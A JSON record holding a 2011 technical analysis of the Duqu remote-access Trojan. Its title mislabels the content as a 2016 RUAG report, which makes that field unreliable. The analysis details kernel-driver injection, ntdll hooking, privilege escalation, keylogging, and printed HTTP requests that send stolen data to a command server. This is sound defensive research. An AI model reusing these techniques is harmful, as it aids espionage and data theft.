{
    "id": "a106472a-1645-4734-b85c-59f710d762cf",
    "created_at": "2023-01-12T15:06:37.108703Z",
    "updated_at": "2025-03-27T02:09:29.29866Z",
    "deleted_at": null,
    "sha1_hash": "6efdcc97b339675e1738eaa7b6e71c3195301445",
    "title": "2016-05-23 - Technical Report about the Malware used in the Cyberespionage against RUAG",
    "authors": "",
    "file_creation_date": "2011-10-20T18:03:45Z",
    "file_modification_date": "2011-10-20T18:03:54Z",
    "file_size": 3209701,
    "plain_text": "## Security Response\n\n# W32.Duqu\n### The precursor to the next Stuxnet\n\n###### Version 1.2 (October 20, 2011)\n\n Contents Executive summary Executive summary............................................ 1\n On October 14, 2011, we were alerted to a sample by a research lab\n Technical analysis............................................... 2\n with strong international connections that appeared very similar to\n File history..................................................... 2\n the Stuxnet worm from June of 2010. This threat has been named\n Component architecture............................... 3\n W32.Duqu [dyü-kyü] because it creates files with the file name pre­\n Load point (JMINET7.SYS)............................ 4\n fix “~DQ”. The research lab provided their detailed initial report to us,\n Main loader (NETP191.PNF)......................... 5\n which we have added as an appendix. The threat was recovered from\n Payload loader (Resource 302)..................... 5\n an organization based in Europe. We have confirmed Duqu is a threat\n Payload (.zdata DLL)..................................... 8\n nearly identical to Stuxnet, but with a completely different purpose.\n Infostealer................................................... 10 Downloaded threats.................................... 12\n Duqu is essentially the precursor to a future Stuxnet-like attack. The\n Variants............................................................. 12\n threat was written by the same authors, or those that have access to the\n CMI4432.SYS.............................................. 12\n Stuxnet source code, and appears to have been created after the last\n CMI4432.PNF.............................................. 13\n Stuxnet file we recovered. Duqu’s purpose is to gather intelligence data\n Acknowledgements.......................................... 14\n and assets from entities such as industrial infrastructure and system\n Appendix........................................................... 14\n manufacturers, amongst others, in order to more easily conduct a future\n File hashes................................................... 14\n attack against another third party. The attackers are looking for informa­\n Version history.................................................. 14\n tion such as design documents that could help them mount a future at­\n\n_The original research lab has also allowed us to include their_ tack on various industries, including industrial control system facilities.\n\n_detailed initial report, which you can find as an appendix._\n\n###### Duqu does not contain any code related to industrial control systems and is primarily a remote access Trojan (RAT). The threat does not self- replicate. Our telemetry shows the threat has been highly targeted to­ ward a limited number of organizations for their specific assets. How­ ever, it’s possible that other attacks are being conducted against other organizations in a similar manner with currently undetected variants.\n\n\n-----\n\n###### The attackers used Duqu to install another infostealer that can record keystrokes and collect other system information. The attackers were searching for information assets that could be used in a future attack. In one case, the attackers did not appear to successfully exfiltrate any sensitive data, but details are not available on all cases. Two variants were initially recovered and, in reviewing our archive of submissions, the first recording of one of the binaries was on September 1, 2011. However, based on file-compilation times, attacks using these variants may have been conducted as early as December 2010. Additional variants were created as recently as October 17th.\n\n Duqu consists of a driver file, a DLL (that contains many embedded files), and a configuration file. These files must be installed by another executable (the installer) which has not yet been recovered. The installer registers the driver file as a service so it starts at system initialization. The driver then injects the main DLL into\n services.exe. From here, the main DLL begins extracting other components and these components are injected into other processes. One of the variant’s driver files was signed with a valid digital certificate that expires on August 2, 2012. The digital certificate belongs to a company headquartered in Taipei, Taiwan. The certificate was revoked on October 14, 2011.\n\n Duqu uses HTTP and HTTPS to communicate to a command and control (C&C) server at 206.183.111.97, which is hosted in India. As of October 18th this IP is inactive. To date this is the only C&C IP encountered and is a reliable indicator of Duqu activity on a network. Through the command and control server, the attackers were able to download additional executables, including an infostealer that can perform actions such as enumerat­ ing the network, recording keystrokes, and gathering system information. The information is logged to a lightly encrypted and compressed local file, and then must be exfiltrated out. In addition to this infostealer, three more DLLs were pushed out by the C&C on October 18th.\n\n The threat uses a custom command and control protocol, primarily downloading or uploading what appear to be .jpg files. However, in addition to transferring dummy .jpg files, additional data for exfiltration is encrypted and sent, and likewise received.\n\n Finally, the threat is configured to run for 36 days. After 36 days, the threat will automatically remove itself from the system. However, Duqu has downloaded additional components that will extend the number of days.\n\n Duqu shares a great deal of code with Stuxnet; however, the payload is completely different. Instead of a payload designed to sabotage an industrial control system, it has been replaced with general remote access capabilities. The creators of Duqu had access to the source code of Stuxnet, not just the Stuxnet binaries. The attackers in­ tend to use this capability to gather intelligence from a private entity that may aid future attacks on a third party. \n\n While suspected, no similar precursor Table 1 files have been recovered that date prior to the Stuxnet attacks. Also, the First Variant original research lab that discovered File Name Size Compile Time Purpose this threat has allowed us to include\n jminet7.sys 24,960 bytes Wed. Nov. 3, 2010 17:25:26 Load at system start\n their detailed initial report, which you\n netp191.PNF 232,448 bytes Thu. Nov. 4, 2010 16:48:28 Main DLL\n can find as an appendix.\n 302 resource 194,048 bytes Tue. Dec. 21, 2010 08:41:29 Loader for payload\n\n#### Technical analysis netp192.pnf 6,750 bytes Configuration file\n\n##### File history Table 2\n\n|Table 1|Col2|Col3|Col4|\n|---|---|---|---|\n|First Variant||||\n|File Name|Size|Compile Time|Purpose|\n|jminet7.sys|24,960 bytes|Wed. Nov. 3, 2010 17:25:26|Load at system start|\n|netp191.PNF|232,448 bytes|Thu. Nov. 4, 2010 16:48:28|Main DLL|\n|302 resource|194,048 bytes|Tue. Dec. 21, 2010 08:41:29|Loader for payload|\n|netp192.pnf|6,750 bytes||Configuration file|\n\n\n###### Duqu has three files: a driver, a main DLL, and an encrypted configuration file. Inside the main DLL is a resource numbered 302, which is actually another DLL. Two Duqu variants were recovered in our initial investigation. Additional variants have since been recovered These are being analyzed\n\n|Table 2|Col2|Col3|Col4|\n|---|---|---|---|\n|Second Variant||||\n|File Name|Size|Compile Time|Purpose|\n|cmi4432.sys|29,568 bytes|Wed. Nov. 3, 2010 17:25:26|Load at system start|\n|cmi4432.pnf|192,512 bytes|Sun. Jul. 17, 2011 07:12:41|Main DLL|\n|302 resource|256,512 bytes|Tue. Dec. 21, 2010 08:41:29|Loader for payload|\n\n\n###### cmi4464.PNF 6,750 bytes Configuration file\n\n\n-----\n\n###### An infostealer was recovered from Table 4 the system that appears to have been\n Additional variants\n downloaded by Duqu through the command and control server. File Name Size Compile Time Purpose\n\n nfred965.sys 24,960 bytes Mon. Oct 17, 2011 20:06:28 Load at system start\n On October 18th three more DLLs were pushed from the server. They netf1.pnf 74,752 bytes Sun. July 17, 2011 07:12:56 Main DLL are downloaded and injected into netf2.pnf 6,750 bytes Configuration file processes for execution. adpu321.sys 24,960 bytes Mon. Oct 17, 2011 20:06:28 Load at system start\n\n Based on the compile times, we can derive a history of the two variants Table 3 and the infostealer. The JMINET/ Infostealer NETP191 variant was the first vari­ ant. In particular, JMINET/NETP191 File Name Size Compile Time Purpose may have been used in a separate [TEMP FILE NAME] 85,504 bytes Wed. Jun 01, 2011 03:25:18 Steal information attack as early as December 2010 and based on this incident we know\n\nTable 5\n\n###### it was still being used in September 2011. The CMI4432 variant was developed later, and clearly DLLs from October 18th used the same components as the JMINET/ MD5 Compile Time NETP191 variant. However, the driver was signed\n 4c804ef67168e90da2c3da58b60c3d16 Mon. Oct 17, 2011 17:07:47\n and the main payload was updated in July 2011. Finally, the infostealer appears to have been first 856a13fcae0407d83499fc9c3dd791ba Mon. Oct 17, 2011 16:26:09 created along the same timeframe, in June 2011. 92aa68425401ffedcfba4235584ad487 Tue. Aug 09, 2011 21:37:39 The most recent variant was created on October 17th, prior to the server being shutdown. Two of the additional DLLs pushed from the C&C were compiled hours before this sample.\n\n Note that the recovered Stuxnet files date be­ Figure 1\n Threat architecture of JMINET/NETP191 variant\n tween June 2009 and March 2010 and therefore date prior to the first development of these vari­ Jminet7.sys ants.\n\nLoads and executes\n\n##### Component architecture\n\n###### The threat begins execution at system start Netp191.pnf through a registered driver (JMINET7.SYS or CMI4432.SYS). The driver file injects the main DLL Loads and decrypts (NETP191.PNF or CMI4432.PNF) into services. exe. Using the configuration file (NETP192.PNF or Contains Netp192.pnf CMI4464.PNF), the main DLL extracts an embed­ Lifetime value ded file: resource 302. Resource 302 is a DLL that Injected processesDNS Addresses contains another embedded section (.zdata) that contains the main functionality of the threat.\n\nresource_302\n\n###### Note that another executable (the installer) must zdata section\n\nContains\n\n###### have created the driver, the configuration file, and the main DLL, as well as registered the driver as\n\nCreates Contains\n\n###### a service. This installer executable has not been recovered. Creates\n\nsort[RAND].nls. C&C module\n\nresource_302\n\n###### The remaining parts of this document will dis­ cuss the JMINET7/NETP191 variant (variant 1) in terms of the separate sections, and enumerates lsass.exe the minor differences between this and variant 2\n\n|Table 4 Additional variants File Name Size Compile Time Purpose nfred965.sys 24,960 bytes Mon. Oct 17, 2011 20:06:28 Load at system start netf1.pnf 74,752 bytes Sun. July 17, 2011 07:12:56 Main DLL netf2.pnf 6,750 bytes Configuration file adpu321.sys 24,960 bytes Mon. Oct 17, 2011 20:06:28 Load at system start|Col2|Col3|Col4|\n|---|---|---|---|\n||Size|Compile Time|Purpose|\n||24,960 bytes|Mon. Oct 17, 2011 20:06:28|Load at system start|\n||74,752 bytes|Sun. July 17, 2011 07:12:56|Main DLL|\n||6,750 bytes||Configuration file|\n||24,960 bytes|Mon. Oct 17, 2011 20:06:28|Load at system start|\n\n|Table 3|Col2|Col3|Col4|\n|---|---|---|---|\n|Infostealer||||\n|File Name|Size|Compile Time|Purpose|\n|[TEMP FILE NAME]|85,504 bytes|Wed. Jun 01, 2011 03:25:18|Steal information|\n\n\n-----\n\n##### Load point (JMINET7.SYS)\n\n###### The purpose of the driver is to activate the threat at system start. The driver is defined as a service with the name and display name of “JmiNET3” under the following registry subkey:\n```\n  HKEY _ LOCAL _ MACHINE\\SYSTEM\\CurrentControlSet\\Services\\JmiNET3\n\n The driver is loaded at kernel initialization (Start Type = 1) and is responsible for injecting the main DLL (NETP191.PNF) into a specified process. The process name to inject into, and the DLL file path that should be injected, are located in the following registry subkey:\n  HKEY _ LOCAL _ MACHINE\\SYSTEM\\CurrentControlSet\\Services\\JmiNET3\\FILTER\n\n The data held within the registry subkeys are encrypted. Once decrypted, the data has the following format:\n  DWORD control[4]\n\n  DWORD encryption _ key\n\n  DWORD sizeof _ processname\n\n  BYTE processname[sizeof _ processname]\n\n  DWORD sizeof _ dllpath\n\n  BYTE dllpath[sizeof _ dllpath]\n\n Note the encryption_key field. The DLL is encrypted on the disk and is decrypted using this key before it is in­ jected into other processes. The encryption uses a simple multiplication rolling key scheme. By default, the main DLL is located at%SystemDrive%\\inf\\netp191.pnf and the injected process is services.exe.\n\n```\n\n###### The driver will ensure the system is not in Safe Mode and no debuggers are running. The driver then registers a Driver­ ReinitializationRoutine and calls itself (up to 200 times) un­ til it is able to detect the presence of the HAL.DLL file. This ensures the system has been initialized to a point where it can begin injecting the main DLL.\n\n The driver injects the DLL by registering a callback with PsSetLoadImageNotifyRoutine. PsSetLoadImageNotifyRou­ tine will execute the callback any time an image, such as a DLL or EXE, is loaded and prior to execution. \n\n If the image loaded is KERNEL32.DLL, the driver will get the addresses of relevant APIs by comparing the hashes of their name to a predefined list. \n\n If the image matches services.exe, the driver will inject some trampoline code that contains the API addresses along with the DLL. The entry point will then be modified to point to the trampoline code.\n\n As part of its operation JMINET7.SYS will also create two devices:\n```\n\\DEVICE\\Gpd1\n\n\\Device\\{3093AAZ3-1092-2929-9391}\n\n JMINET7.SYS is functionally equivalent and almost a binary match to MRXCLS.SYS from Stuxnet.\n\n Figure 2 shows how NETP191.PNF is injected.\n\n```\n\nFigure 2\n###### How NETP191.PNF is injected\n\n\n-----\n\n###### variant 1 (cmi4432) removed export 3 export 7\n\n##### Main loader (NETP191.PNF)\n\n\n### RPC\n\n\n###### When executed, NetP191.pnf decrypts the configuration data stored in Netp192.pnf. A “lifetime” value in the configuration data is checked. If the sample has been running for more than 36 days then export number 2 is called. Export 2 calls export 6, which is the cleanup routine. This routine removes traces of the threat from the compromised computer. If the threat has been running for less than 36 days, then it continues to function.\n\n The threat may then check if it is connected to the Internet by performing a DNS lookup for a domain stored in the configuration data (in this instance the domain is Microsoft.com). If this fails, an additional DNS lookup is performed on kasperskychk.dyndns.org. The threat expects this domain to resolve to 68.132.129.18, but it is not currently registered. This behavior does not occur by default.\n\n NETP191.PNF will then inject itself into one of four processes:\n\n • Explorer.exe\n\n • IExplore.exe\n\n • Firefox.exe\n\n • Pccntmon.exe\n\n The RPC component is only intended for local use and makes seven functions available. These are:\n\n • Get the version information from the configuration data\n\n • Load a module and run the export\n\n • Load a module\n\n • Create a process\n\n • Read a file\n\n • Write a file\n\n • Delete a file\n\n Of these exported functions, Duqu only uses the first three in order to load and execute the embedded resource 302. This RPC component is identical to Stuxnet’s RPC component. In addition, the DLL can scan for and attempt to disable a variety of security products.\n\n\n##### Payload loader (Resource 302)\n\n###### This DLL file is contained within the main DLL, NetP191.pnf.\n\n Resource 302 is a loader program. It can load the payload into memory and execute it in several different ways. The payload is included in the .zdata section of resource 302. The .zdata section is compressed and consists of the payload DLL, a configuration file containing C&C information, and a second DLL, which contains similar code to that found at the start of resource 302 itself.\n\n\n-----\n\n###### The main function of resource 302 is to load a file into memory. Which file to load is not configurable, but instead is hardcoded into the payload file that is stored in the .zdata section. We refer to this main function as LoadFile. Note that functionality also exists to allow the loading of a direct memory buffer, but is not utilized. LoadFile can be called as follows:\n```\nLoadFile ( LoadMethod, ProcessName, String );\n\n Where:\n\n • LoadMethod is a number from zero to three that specifies the loading technique to use (discussed below).\n\n • ProcessName is a preferred name to use for the newly loaded file.\n\n • A string that can be passed into resource 302 (normally this is set to 0).\n\n Summary of the LoadMethod 0 – 3:\n\n • 0: Hook Ntdll and call LoadLibrary with the parameter sort[RANDOM].nls. This file does not actually exist.\n\n • 1: Use a template .exe file to load the payload DLL by creating the executable process in suspended mode and\n then resuming execution.\n • 2: Use CreateProcessAsUser to execute the template executable and elevate privileges as needed.\n\n • 3: Attempt to use an existing process name for the template executable and elevate privileges.\n\n Exports\n\n Resource 302 has 12 exports. The majority of these exports call the LoadFile function, though each export calls it with different hardcoded parameters:\n\n • Export 1:  LoadFile( 0, 0, 0)\n\n • Export 2: LoadFile( 1, 0, 0)\n\n • Export 4: LoadFile( 1, 0, 0)\n\n • Export 5: LoadFile( 1, 0, 0)\n\n • Export 7: LoadFile( 1, 0, arg0)\n\n • Export 10: LoadFile( 3, “iexplore.exe”, 0 )\n\n • Export 11: LoadFile( 3, “explorer.exe”, 0 )\n\n • Export 12: LoadFile( 2, “explorer.exe”, 0 )\n\n • Export 13: Run in svchost\n\n • Export 14: Load the second DLL in the .zdata section, and call export 16\n\n • Export 15: LoadFile( 3, “svchost.exe”, 0 )\n\n • Export 16: Inject payload in the default browser and elevate privileges\n\n Loading techniques\n\n Method 0\n\n This method of loading involves reading ntdll.dll from memory and hooking the following functions:\n\n • ZwQueryAttriutesFile\n\n • ZwCloseFile\n\n • ZwOpen\n\n • ZwMapViewOfSection\n\n • ZwCreateSection\n\n • ZwQuerySection\n\n These functions are replaced with new functions that monitor for the file name sort[RANDOM].nls. When Load­ Library is called with that file name, these replacement functions that are called by LoadLibrary will load the DLL from a buffer in memory, rather than from the disk. In this way the payload can be loaded like a regular file on disk, even though it does not exist on the disk (when searching for the file, it will not be found). This routine is similar to a routine used by Stuxnet.\n\n```\n\n-----\n\n### EoP\n\n\n###### Method 1\n\n Using this method a template executable is decoded from inside the loader. The template is an executable that will load a DLL from a buffer and call a specified export from the loaded DLL. The loader populates the template with the correct memory offsets so that it can find the payload and launch it.\n\n A chosen process is overwritten (it can be one of a list of processes, the default name is svchost.exe).\n\n The chosen process is created in suspended mode and then is overwritten with the template executable. Then the process is resumed and the template runs, loading the DLL and executing the specified export under the name of a legitimate process. This routine is also similar to the one used in Stuxnet.\n\n Method 2\n\n This method is similar to Method 1, using the template-loading technique. However, Method 2 attempts to el­ evate privileges before executing the template executable. It can use several different techniques to do this.\n\n First it attempts to gain the following privileges:\n\n • “SeDebugPrivilege”\n\n • “SeAssignPrimaryTokenPrivilege”\n\n • “SeCreateTokenPrivilege”\n\n If this is sufficient the threat uses these to create the template process, as in Method 1.\n\n If the threat still does not have sufficient access, then it will call the following APIs to try to elevate its privileges further:\n\n • GetKernelObjectSecurity\n\n • GetSEcurityDescriptorDACL\n\n • BuildExplicitAccessWithName\n\n • MakeAbsoluteSD\n\n • SetEntriesinACLW\n\n • SetSecurityDescriptorDACL\n\n • SetKernelObjectSecurity\n\n If it is able to create the process after this, it proceeds. Otherwise it will try to gain the following privileges:\n\n • “SeTcbPrivilege”\n\n • “SeAssignPrimaryTokenPrivilege”\n\n • “SeIncreaseQuotaPrivilege”\n\n • “SeImpersonatePrivilege”\n\n Then the threat attempts to duplicate a token before using that token in a call to CreateProcessAsUser.\n\n Method 3\n\n This method must be supplied by a process name that is already running. This method also uses the template ex­ ecutable to execute the payload DLL and will try to use the last technique (mentioned above) to elevate privileges also.\n\n .zdata section\n\n The .zdata section is compressed and consists of three files and a header that points to each file.\n\n When the resource is decompressed, it is byte-for-byte identical to the data that is in resource 302 of\n CMI4432.PNF, the second variant. The resource in CMI4432.PNF is not an MZ file, it is simply the raw data stored in the resource.\n\n The beginning of the decompressed .zdata section is shown below. The first dword (shown in red) is a magic value to denote the start of the index block. The next dword (shown in red) is the offset to the MZ file. The offset is 00009624 (you can see that next portion marked in red is an MZ file and it is at offset 9624). This is how the\n\n\n-----\n\n###### loader file finds the payload DLL in the .zdata section. It reads the 24h byte index block, which lets the loader know the offset and size of the various files stored in the decompressed .zdata section. \n\nFigure 4\n###### Decompressed .zdata section\n\n In the .zdata section there are two DLLs and one configuration file. The configuration file is not accessed by the loader at anytime, but is used exclusively by the payload. When the payload is loaded into memory and executed, the loader also passes a pointer to the decompressed .zdata data so the payload has access to the configuration file using the index block, as also show above.\n\n As for the other DLL in the .zdata section, it is actually a copy of resource 302 itself, but it does not have a .zdata section. Export 16 in the loader is able to extract this other DLL from the .zdata section and call export 16. How­ ever, that function appears to be broken.\n\n The index block (above) is the exact same layout that was used in the .stub section of the previous Stuxnet samples.\n\nFigure 5\n###### The .zdata section inside Resource302.dll\n\n##### Payload (.zdata DLL)\n\n###### The .zdata section contains the final payload DLL and its associated configuration data. The .zdata payload DLL is decompressed and loaded by the resource 302 DLL, the payload loader. \n\n\n-----\n\n###### To function properly, it expects a blob of data (.zdata) with the following structure:\n```\n00000000 config _ res302  struc ; (sizeof=0x24)\n\n00000000 magic      dd ?\n\n00000004 main      ofs _ size ?\n\n0000000C config     ofs _ size ?\n\n00000014 template    ofs _ size ?\n\n0000001C null      ofs _ size ?\n\n00000024 config _ res302  ends\n\n The template is an executable file with an empty loader component which may be used by the module to load and execute other modules, potentially downloaded through the command and control server. \n\n The configuration data contains a file name, %Temp%\\~DR0001.tmp, the command and control server IP ad­ dress of 206.183.111.97, and control flag bytes that influence its behavior. The command and control server is hosted in India. The configuration data is parsed and stored in separate objects.\n\n The protocol works as follows. First an initial HTTPS exchange occurs. For HTTPS, Duqu uses the Windows WinHTTP APIs, which have SSL support. The HTTPS exchange is believed to transfer a session key. Then, a HTTP GET request to the root directory occurs using standard socket APIs.\n--\nGET / HTTP/1.1\n\nCookie: PHPSESSID=spwkwq1mtuomg0g6h30jj203j3\n\nCache-Control: no-cache\n\nPragma: no-cache\n\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.9)\n\nGecko/20100824 Firefox/3.6.9 (.NET CLR 3.5.30729)\n\nHost: 206.183.111.97\n\nConnection: Keep-Alive\n\n--\n Note that the custom cookie field is unique per request. The server replies with an HTTP 200 OK response con­ taining a small 54x54 white .jpg file.\n--\nHTTP/1.1 200 OK\n\nContent-Type: image/jpeg\n\nTransfer-Encoding: chunked\n\nConnection: Close\n\n--\n The module expects certain fields and it parses the response for them. It only continues if they are found. It then makes a second HTTP POST request, uploading a default .jpg file that is embedded within the .zdata DLL, fol­ lowed by data to send to the command and control server.\n--\nPOST / HTTP/1.1\n\nCookie: PHPSESSID=spwkwq1tnsam0gg6hj0i3jg20h\n\nCache-Control: no-cache\n\nPragma: no-cache\n\nContent-Type: multipart/form-data;\n\nboundary=---------------------------b1824763588154\n\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.9)\n\nGecko/20100824 Firefox/3.6.9 (.NET CLR 3.5.30729)\n\n```\n\n-----\n\n### IPC$\n\n```\nHost: 206.183.111.97\n\nContent-Length: 1802\n\nConnection: Keep-Alive\n---------------------------b1824763588154\n\nContent-Disposition: form-data; name=”DSC00001.jpg”\nContent-Type: image/jpeg\n\n[EMBEDDED JPEG AND STOLEN DATA]\n\n--\n###### The server then acknowledges with:\n--\nHTTP/1.1 200 OK\n\nConnection: Keep-Alive\n\nContent-Length: 0\n\n--\n The data following the JPG is encrypted data that the client wishes to send to the command and control server. The data is AES-encrypted using the prenegotiated session key and has the following format:\n00 BYTE[12] header, semi-fixed, starts with ‘SH’\n\n0C BYTE type of payload\n\n0D DWORD payload size (n)\n\n11 DWORD sequence number\n\n15 DWORD ack number / total size\n\n19 DWORD unknown\n\n1D BYTE[n] payload (encrypted, or encoded)\n\n The sequence number will increment with each transaction. Example types include 0x02, 0x05, 0x14, 0x0C, 0x44. Typically the payload type will be set to 0x24, which is just a ping-type request. More information on each type and their content will be published in a future edition, as the full scope of the command and control func­ tionality is still being investigated.\n\n The server can actually respond with encrypted data that will be decrypted and trigger further actions.\n\n While the SMB protocol is not configured for use, the code appears to be fully functional and may be used if com­ manded to do so. The configuration file would set a byte value to 1, specifying the SMB protocol. Instead of an IP address, a string representing a remote resource (e.g. \\\\RemoteServer\\) would be provided. The threat then connects to the IPC$ share of the remote resource and can read and write to a file as necessary as a means of communication.\n\n```\n\n##### Infostealer\n\n###### This is a standalone executable. This file, while recovered on compromised computers, is not found within the other executables. This file was likely downloaded by Duqu at some time, or downloaded to the compromised computer through other means.\n\n The file has a number of similarities with the other samples analyzed. In particular, the primary functionality is performed by exported functions from a DLL contained within the executable. In addition, the contained DLL is stored as encrypted data in a JPEG file, similar to the command and control technique.\n\n The file is an infostealer. When executed, it extracts the encrypted DLL from a JPEG stored within it and then ex­ ecutes export number 2 of that DLL. The DLL steals data and stores it in a randomly numbered file in the user’s %Temp% folder, prepending the log files with ~DQ (e.g. ~DQ7.tmp). The file is compressed using bzip2 and then XOR-encrypted. The recorded data can consist of:\n\n • Lists of running processes account details and domain information\n\n\n-----\n\n###### • Screenshots\n\n • Network information (interfaces, routing tables, shares list, etc.)\n\n • Key presses\n\n • Open window names\n\n • Enumerated shares\n\n • File exploration on all drives, including removable drives\n\n • Enumeration of computers in the domain through NetServerEnum\n\n The executable’s behavior is determined through optional command-line parameters. The usage format is as fol­ lows:\n```\nprogram xxx /in <cmdfile> /out <logfile>\n\n • If cmdfile is not present, a default encrypted command blob is used, stored as one of the infostealer’s resourc­\n es.\n • If logfile is not present, the log will be dumped to a random .tmp file in user’s %Temp% folder, prefixed with\n ~DQ (e.g. ~DQ7.tmp).\n\n The other Infostealer’s resource is the Infostealer DLL itself, embedded in a .jpg file.\n\n The executable simply loads the DLL inside winlogon or svchost, and executes the appropriate export:\n\n • _1 (unused), similar to _2\n\n • _2 main\n\n • _3 (unused), similar to _2\n\n • _4 restart infostealer\n\n • _5 quit infostealer\n\n The command blob determines what should be stolen and at which frequency.\n\n The DLL offers nine main routines:\n\n • 65h: List of running processes, account details, and domain information\n\n • 66h: Drive names and information, including those of shared drives\n\n • 68h: Take a screenshot\n\n • 69h: Network information (interfaces, routing tables, shares list, etc.)\n\n • 67h: Keylogger\n\n • 6Ah: Window enumeration\n\n • 6Bh: Share enumeration\n\n • 6Dh: File exploration on all drives, including removable drives\n\n • 6Eh: Enumerate computers on the domain through NetServerEnum\n\n The standard command blob (used when cmdfile is not specified) is:\n\n • 65h, frequency=30 seconds\n\n • 66h, frequency=30 seconds\n\n • 68h, frequency=30 seconds\n\n • 69h, frequency=30 seconds\n\n • 67h, frequency=30 seconds\n\n • 6Ah, frequency=30 seconds\n\n • 6Bh, frequency=30 seconds\n\n • 6Dh, frequency=30 seconds\n\n Note: The threat only uses eight routines (6Eh is not used).\n\n The log file contains records with the following fields:\n\n • Type\n\n • Size \n\n • Flags \n\n • Timestamp\n\n```\n\n-----\n\n##### Downloaded threats\n\n###### On October 18th, the command and control server pushed three more DLLs out prior to being shutdown. These are injected into processes for execution.\n\n The first sample, md5 4c804ef67168e90da2c3da58b60c3d16 was compiled on Monday, October 17, 2011 at 17:07:47 PST. It is a recon module DLL used to get system information. The information it obtains is listed as fol­ lows:\n\n • Is the computer part of a domain?\n\n • The current module name, current PID, current session ID, Windows folder, and %Temp% folder. OS version,\n including if it is 64-bit OS.\n • Account name of the running process.\n\n • Network adapters information.\n\n • Of most interest: Time information, including local and system times, as well as time zone information and DST\n bias.\n\n Two additional samples were then downloaded. These are also DLLs. The first, md5 856a13fcae0407d83499fc­ 9c3dd791ba, was compiled on Monday, October 17, 2011 at 16:26:09 PST. It is a small DLL that can be used to update the ‘daycount’ field of the main configuration data block of Duqu. It is used to increase the lifetime of the threat. As stated, Duqu checks this lifetime value, and removes itself if it passes 36 days. The DLL can also gather the size of files in the Windows folder (file names are caller-provided).\n\n The last sample md5, 92aa68425401ffedcfba4235584ad487, was compiled on Tuesday, August 09, 2011 at 21:37:39 PST. This file is very similar to the standalone infostealer executable described previously; however, it is a DLL this time. It is also newer (August 9 vs. May 31 for the executable) and offers less functionality than the executable. The functions offered are only seven stealing routines (nine previously). These are:\n\n • List of running processes, plus account and domain\n\n • List drive names and information, including shared drives\n\n • Screenshot\n\n • Network information (interfaces, routing tables, and shares list)\n\n • Windows enumeration\n\n • Share enumeration\n\n • Share browse\n\n The following functions no longer exist:\n\n\n\n###### • Keylogger\n\n • File exploration on all drives,\n including removable drives\n • Domain’s servers enumeration\n (using NetServerEnum)\n\n#### Variants\n\n###### The following section discusses the differences seen in the minor vari­ ants of Duqu.\n\n##### CMI4432.SYS\n\n###### This is functionally equivalent to JMINET7.SYS except that CMI4432. SYS is digitally signed. The signa­ ture information is displayed in figure 6.\n\n\nFigure 6\n###### CMI4432.SYS signature information\n\n C-Media\n\n\n-----\n\n##### CMI4432.PNF\n\n###### This file is a more recent variant of netp191.pnf. The differences between Netp191 and CMI4432.PNF are shown in figure 7.\n\nFigure 7\n###### Differences between variants\n\n The additional samples, netf1.pnf, are being analyzed.\n\n\n-----\n\n#### Acknowledgements\n\n###### We wish to thank the research lab who notified us of the sample and provided their research and samples.\n\n#### Appendix\n\n##### File hashes\n\nTable 6\n###### Sample names and hashes\n File compilation MD5 File name Comment date\n\n 0eecd17c6c215b358b7b872b74bfd800 11/3/2010 17:25 jminet7.sys Originally discovered file\n\n b4ac366e24204d821376653279cbad86 11/4/2010 16:48 netp191.PNF Encrypted DLL loaded by jminet7.sys\n\n 94c4ef91dfcd0c53a96fdc387f9f9c35 netp192.pnf Config file loaded by netp191.PNF\n\n 4541e850a228eb69fd0f0e924624b245 11/3/2010 17:25 cmi4432.sys Originally discovered file\n\n 0a566b1616c8afeef214372b1a0580c7 7/17/2011 7:12 cmi4432.pnf Encrypted DLL loaded by cmi4432.sys\n\n e8d6b4dadb96ddb58775e6c85b10b6cc cmi4464.PNF Config file loaded by cmi4432.pnf\n\n 9749d38ae9b9ddd81b50aad679ee87ec 6/1/2011 3:25 keylogger.exe Originally discovered infostealer\n\n 4c804ef67168e90da2c3da58b60c3d16 10/18/2011 1:07 N/A Recon DLL pushed by the C&C\n\n 856a13fcae0407d83499fc9c3dd791ba 10/18/2011 0:26 N/A “Lifetime” updater pushed by C&C\n\n 92aa68425401ffedcfba4235584ad487 8/10/2011 5:37 N/A Reduced functionality infostealer pushed by C&C\n\n c9a31ea148232b201fe7cb7db5c75f5e 10/17/2011 20:06 nfred965.sys Sys file obtained from European organization\n\n f60968908f03372d586e71d87fe795cd 11/3/2010 17:25 nred961.sys Sys file obtained from European organization\n\n 3d83b077d32c422d6c7016b5083b9fc2 10/17/2011 20:06 adpu321.sys Sys file obtained from VirusTotal\n\n#### Version history\n\n##### Version 1.0 (October 18, 2011)\n\n###### • Initial publication.\n\n##### Version 1.1 (October 19, 2011)\n\n###### • Removed duplicate Note from Executive summary.\n\n • Fixed minor typos.\n\n##### Version 1.2 (October 20, 2011)\n\n###### • Updated paper with information about latest samples.\n\n • Replaced image in figure 1 with zoomable, vector graphic.\n • Added Downloaded threats section.\n • Expanded information in File hashes appendix.\n • Added Version history section.\n • Minor edits.\n\n|ppendix File hashes|Col2|Col3|Col4|\n|---|---|---|---|\n|Table 6||||\n|Sample names and hashes||||\n|MD5|File compilation date|File name|Comment|\n|0eecd17c6c215b358b7b872b74bfd800|11/3/2010 17:25|jminet7.sys|Originally discovered file|\n|b4ac366e24204d821376653279cbad86|11/4/2010 16:48|netp191.PNF|Encrypted DLL loaded by jminet7.sys|\n|94c4ef91dfcd0c53a96fdc387f9f9c35||netp192.pnf|Config file loaded by netp191.PNF|\n|4541e850a228eb69fd0f0e924624b245|11/3/2010 17:25|cmi4432.sys|Originally discovered file|\n|0a566b1616c8afeef214372b1a0580c7|7/17/2011 7:12|cmi4432.pnf|Encrypted DLL loaded by cmi4432.sys|\n|e8d6b4dadb96ddb58775e6c85b10b6cc||cmi4464.PNF|Config file loaded by cmi4432.pnf|\n|9749d38ae9b9ddd81b50aad679ee87ec|6/1/2011 3:25|keylogger.exe|Originally discovered infostealer|\n|4c804ef67168e90da2c3da58b60c3d16|10/18/2011 1:07|N/A|Recon DLL pushed by the C&C|\n|856a13fcae0407d83499fc9c3dd791ba|10/18/2011 0:26|N/A|“Lifetime” updater pushed by C&C|\n|92aa68425401ffedcfba4235584ad487|8/10/2011 5:37|N/A|Reduced functionality infostealer pushed by C&C|\n|c9a31ea148232b201fe7cb7db5c75f5e|10/17/2011 20:06|nfred965.sys|Sys file obtained from European organization|\n|f60968908f03372d586e71d87fe795cd|11/3/2010 17:25|nred961.sys|Sys file obtained from European 